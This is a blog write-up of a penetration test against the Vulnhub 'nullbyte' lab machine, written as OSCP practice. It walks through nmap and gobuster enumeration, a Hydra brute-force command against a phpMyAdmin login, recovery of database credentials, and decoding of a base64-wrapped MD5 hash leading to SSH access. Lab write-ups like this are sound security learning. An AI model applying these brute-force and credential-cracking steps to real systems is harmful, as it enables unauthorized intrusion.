---
layout: post
title: Vulnhub:nullbye
---

Today's box on my OSCP journey is [nullbybe](https://www.vulnhub.com/entry/nullbyte-1,126/).  This box was a lot of fun and one of those boces you can do 2 or more ways.  Here's how I thought through it.

### Disclaimer

A quick disclaimer here: these aren't going to be "here's how I got root".  The best part about the OSCP journey has been the persepctive I've gained looking at systems and thinking through them, especially coming from a blue team background.  I like to write these to help explain how I thought through the box, where I needed help, and what I learned.

## Enumeration

NNNNMMMMMMAAAAAAAAPPPPP
```
nmap -A 10.10.10.10
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 22:45 EST
Nmap scan report for 10.10.10.10
Host is up (0.046s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE VERSION

80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-server-header: Apache/2.4.10 (Debian)
|_http-title: Null Byte 00 - level 1

111/tcp open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          33323/udp   status
|   100024  1          33872/tcp   status
|   100024  1          43582/udp6  status
|_  100024  1          57223/tcp6  status

777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 (DSA)
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 (RSA)
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 (ECDSA)
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 (ED25519)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=1/6%OT=80%CT=1%CU=31213%PV=Y%DS=2%DC=T%G=Y%TM=5FF68426
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=10B%TI=Z%II=I%TS=8)OPS(O1=M5
OS:06ST11NW6%O2=M506ST11NW6%O3=M506NNT11NW6%O4=M506ST11NW6%O5=M506ST11NW6%O
OS:6=M506ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120)ECN(R=Y%D
OS:F=Y%T=40%W=7210%O=M506NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T
OS:6(R=N)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%R
OS:UD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT      ADDRESS
1   45.21 ms 192.168.49.1
2   45.40 ms 192.168.136.16

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 50.54 seconds


nmap -p- 10.10.10.10
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 22:48 EST
Nmap scan report for 192.168.136.16
Host is up (0.057s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
33872/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 56.66 seconds

nmap --script vuln 10.10.10.10
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-06 22:46 EST
Nmap scan report for 192.168.136.16
Host is up (0.051s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
80/tcp  open  http
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-enum: 
|   /phpmyadmin/: phpMyAdmin
|_  /uploads/: Potentially interesting folder
| http-slowloris-check: 
|   VULNERABLE:
|   Slowloris DOS attack
|     State: LIKELY VULNERABLE
|     IDs:  CVE:CVE-2007-6750
|       Slowloris tries to keep many connections to the target web server open and hold
|       them open as long as possible.  It accomplishes this by opening connections to
|       the target web server and sending a partial request. By doing so, it starves
|       the http server's resources causing Denial Of Service.
|       
|     Disclosure date: 2009-09-17
|     References:
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750
|_      http://ha.ckers.org/slowloris/
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
111/tcp open  rpcbind
777/tcp open  multiling-http

Nmap done: 1 IP address (1 host up) scanned in 336.60 seconds
```
It's a Linux box running Apache with HTTP, SSH on port 747 and RPC (111 and 33872) open.  The first thing I did was confirm that 777 was SSH by trying to SSH to it:

> ssh admin@10.10.10.10

I enter a garbage password and get login failed.  SSH confirmed.  The only thing we could do here is brute force SSH, but that sounds like an awful idea.

I run a few tools to enumerate RPC next:

```
rpcclient -U "" -N 10.10.10.10
Cannot connect to server.  Error was NT_STATUS_CONNECTION_REFUSED


rpcinfo 10.10.10.10
   program version netid     address                service    owner
    100000    4    tcp6      ::.0.111               portmapper superuser
    100000    3    tcp6      ::.0.111               portmapper superuser
    100000    4    udp6      ::.0.111               portmapper superuser
    100000    3    udp6      ::.0.111               portmapper superuser
    100000    4    tcp       0.0.0.0.0.111          portmapper superuser
    100000    3    tcp       0.0.0.0.0.111          portmapper superuser
    100000    2    tcp       0.0.0.0.0.111          portmapper superuser
    100000    4    udp       0.0.0.0.0.111          portmapper superuser
    100000    3    udp       0.0.0.0.0.111          portmapper superuser
    100000    2    udp       0.0.0.0.0.111          portmapper superuser
    100000    4    local     /run/rpcbind.sock      portmapper superuser
    100000    3    local     /run/rpcbind.sock      portmapper superuser
    100024    1    udp       0.0.0.0.130.43         status     107
    100024    1    tcp       0.0.0.0.132.80         status     107
    100024    1    udp6      ::.170.62              status     107
    100024    1    tcp6      ::.223.135             status     107
```

Not much luck there.  Unauthenticated login didn't work but we do see which services are exposed.  RPC certainly isn't my expertise but I see nothing to go off of here.

Now, let's check out that web site.  As always, we run a directory brute force and check robots.txt.  Let's kick off dirbuster and browse to the site:

> gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -t 25

By the way, gobuster can brute force a few things: dns subdomains, directories, etc.  The above command is the prety standard one for brute forcing directories.  "-w" specifies the word list and on Kali, using the dirbuster one always works pretty well.  The only think I like to add is manually checking for directories related to the site or company.  e.g. nike.com/nike.  If we were doing this for real, we would run a tool like cewl and get a wordlist based on the site contents.  "-u" is the URL.  Not that if you want to go down a level, you have to add it to the URL.  For example, say you found nike.com/admin on your first run.  You would then have to run gobuster again like "-u http://nike.com/admin" - gobuster is NOT recursive by default.  that's generally a good thing as the old dirbuster is slow as a dial up modem.  Finally, "-t" is the number of threads.  In the real world, a WAF or even fail2ban would crush our brute force, so you would do this very slow, maybe 2 threads.  Since this is a for learning, we crank it up for the sake of speed.

![nullbytehome](/images/nb1.png)

The homepage doesn't have any links or any clues.  Side bar: always look at the actual HTML.  If you're doing a CTF, there is a good chance there is a hint somewhere in there.  Sometimes admins are sloppy and leave comments or at the very least, you'll understand how the page works and how you might attack it.

Gobuster is done.

```
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10 -t 25
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.136.16
[+] Threads:        25
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2021/01/06 22:46:51 Starting gobuster
===============================================================
/uploads (Status: 301)
/javascript (Status: 301)
/phpmyadmin (Status: 301)
/server-status (Status: 403)
===============================================================
2021/01/06 22:54:32 Finished
===============================================================
```

So far, web is looking way more juicy than SSH or RPC.  "/uploads" should make any pen tester salivate and "phpmyadmin" probably means an admin interface is exposed.  Let's keep going.  Did we find them all?  What about robots.txt? 

### Robots.txt

![nullbytehome](/images/nb2.png)

Aww man.  At least gobuster (and NMAP) gave us some sites to check out.

### Uploads

![nullbytehome](/images/nb3.png)
Dang it!  I can't see anything but it is promising.  We might be able to upload a webshell and browse here.  We could kick off another gobuster checking this directory but we're not there yet.

### phpMyAdmin

![nullbytehome](/images/nb4.png)

Heeeelllllloooooooo nurse!  This is definitely a login page.  But what the heck is phpmyadmin?  We can attack the page, but we need to learn a little more about it so we aren't blindly throwing creds at it.  

## Research

Being completely uneducated on phpmyadmin, I head over to Wikipedia and read up.  It's just a php front end for MySQL.  Ok cool, we might be able to throw some code in a database or upload a php web shell.  I need creds though... [phpMyAdmin Default Creds](https://stackoverflow.com/questions/5818358/phpmyadmin-default-login-password).  Obviously the default doesn't work, but at least I have a username.

Oh, and don't forget searchsploit.  I don't see anything that jumps out at me.  Plus I don't even know what version it's running yet.

```
searchsploit phpmyadmin
```

## Initial Compromise

This is where this box gets fun.  To use Hydra to brute force a login, you'll need to capture the parameters and identify the HTTP method (POST, etc).  You can easily do this in Chrome developer tools, but I looooooove Burp Suite.  Let's fire up Burp and navigate to the phpMyAdmin login page. 

The newest Burp is pretty aesthetically pleaing.  Make sure intercept is turned on and your browser is set.  Maybe I'll go over that setup in another post.  Go back to your browser, enter some creds and hit "go" then pop over to Burp.  Send that request to Repeater so we can mess with the request:

![nullbytehome](/images/nb5.png)

Note the top and bottom of the request pane.  It's an HTTP POST with the pma_username, pma_password, target... and on the right pane, the error message when you fail to login.  Now we've got good info for Hydra.  Still, I sent a few requests changing the password and the token just to see if I could cause different errors.  Nothing crazy happened, so it's time to try Hydra.

### Hydra

Hydra is another versatile tool well worth putting in your cheat sheet.  Here's the command I drew up:

>hydra -l "root" -P rockyou.txt 10.10.10.10 http-post-form "/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1&target=index.php&token=229b41f3a9baa221b3a9939893367538:#1045 Cannot log in to the MySQL server" -t 50 -V

I specified the username guessing that it would be the default.  Then select a wordlist.  I actually used smaller ones but they were unsuccessful. In general, don't use the big gun unless you have to.  Since we identified a HTTP POST, we tell Hydra to use POST.  The nwe build the Hydra parameters.  It's basically "page:parameters:error".  Note the variables ^USER^ and ^PASS^.

I let this run and grabbed a cup of tea.  I come back to success!  That was quick.  Wait... Hydra stopped but it isn't displaying a password... Note that I ran the command with "-V" or verbose, so it would output the attempts as they happened.  I noticed it stopeped at a specific line in the rockyou.txt file, so I open rockyou.txt.  It stopped after it tried a 3 character password.  Why?!?!!?!?!? (notice the amount of question marks and exclamation points)  

Let's try the password in the browser.   Oh... I get a different error.  I play with it some more and realize if you give it less than 4 characters, you get an error that the password cannot be blank.  Ok, now I get it.  The password policy is probably at least 6 characters or something, so when we try less than than, we get a different error than the one I fed Hydra.  I look at the Hyrda docs to see if I can enter 2 different error codes.  Nope.  Looks like it only supports one. 

Then a tiny lightbulb goes off in my head... it would be faster and I wouldn't get the error if I just stripped values less than 5 characters or so in my password list.  I copy rockyou to a local directory.  I know sed can do this, but I'm not a Linux wizard... so I google.

>sed '/^.\{,4\}$/d' rockyou.txt -i

To verify, I open rockyou.txt in Vim and look for lines of 4 characters:

>/^.\{,4}$/

Looks like we are in business.  I run Hydra again with the new passowrd list.  And wait.  And wait.  I go though all my notes so far.  Did I miss anything?  Should we spin up a Hydra to brute force SSH at the same time?  Could this box be all about brute force?

After a small eternity, WINNING:

```
[80][http-post-form] host: 10.10.10.10   login: root   password: sunnyvale
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-01-09 00:53:48
```

### phpMyAdmin

Let's use our new creds and login.  Ok, nothing spectacular.  I see a database name on the left hand side called "seth" and start clicking into that... interesting:

![nullbytehome](/images/nb6.png)

Are those usernames and a hashed password?  w00t!  I copy the hash off and throw it over in ![Crackstation](https://crackstation.net/).

![nullbytehome](/images/nb7.png)

Dang it.  What kind of hash is it?  One resource I always reference for hashes is [Hashcat](https://hashcat.net/wiki/doku.php?id=example_hashes) and the command line hashid.

>hashid YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE
Analyzing 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE'
[+] Cisco-IOS(SHA-256) 
[+] Cisco Type 4 

Cisco?  We're not onm a router.  I find another site to crack Cisco SHA256.  That doesn't work either.  Something is off here.  I repeat the entire process, racking my brain.  This doesn't make any sense.  Fianlly, I'm staring at the hash and it dawns on me... this looks a lot like base64 except it's missing equals signs.

```
# echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE==" | base64 -d
c6d6bd7ebf806f43c76acc3681703b81base64: invalid input
# echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d
c6d6bd7ebf806f43c76acc3681703b81
```

Ohhhh so it's an MD5 that was base64 encoded and then the equals sign chopped off?  Creative.

```
hashid c6d6bd7ebf806f43c76acc3681703b81
Analyzing 'c6d6bd7ebf806f43c76acc3681703b81'
[+] MD2 
[+] MD5 
[+] MD4 
[+] Double MD5 
[+] LM 
[+] RIPEMD-128 
[+] Haval-128 
[+] Tiger-128 
[+] Skein-256(128) 
[+] Skein-512(128) 
[+] Lotus Notes/Domino 5 
[+] Skype 
[+] Snefru-128 
[+] NTLM 
[+] Domain Cached Credentials 
[+] Domain Cached Credentials 2 
[+] DNSSEC(NSEC3) 
[+] RAdmin v2.x 
```

I throw that into crackstation and we get it: "omega".  Wow, nice short password you lazy user, Ramses.

### PWN User

Now I can just SSH in and I have user:

```
ramses@NullByte:~$ whoami
ramses
ramses@NullByte:~$ ls -al
total 24
drwxr-xr-x 2 ramses ramses 4096 Jul  9  2020 .
drwxr-xr-x 5 root   root   4096 Aug  2  2015 ..
-rw------- 1 ramses ramses    0 Mar  5  2020 .bash_history
-rw-r--r-- 1 ramses ramses  220 Aug  2  2015 .bash_logout
-rw-r--r-- 1 ramses ramses 3515 Aug  2  2015 .bashrc
-rw-r--r-- 1 ramses ramses   33 Jan  9 12:43 local.txt
-rw-r--r-- 1 ramses ramses  675 Aug  2  2015 .profile
```

There's local.txt, grab the flag.

Now here is where I like this box.  We did that, but we were root inside of phpMyAdmin.  Couldn't we have done something else?  Remember that uploads directory?  Was that a red herring?  I go back to phpMYAdmin and start poking again.  At the top there is a "SQL" tab.  Huh, so I can run SQL.  I already have the contents of the "seth" database though.  I've done other boxes where you trick SQL to run code.  And phpMyAdmin is written in PHP... can I get a PHP web shell?  I check my cheat sheet for PHP and SQL, but alas I have no notes on it.  So I do what everyone does: search the web.
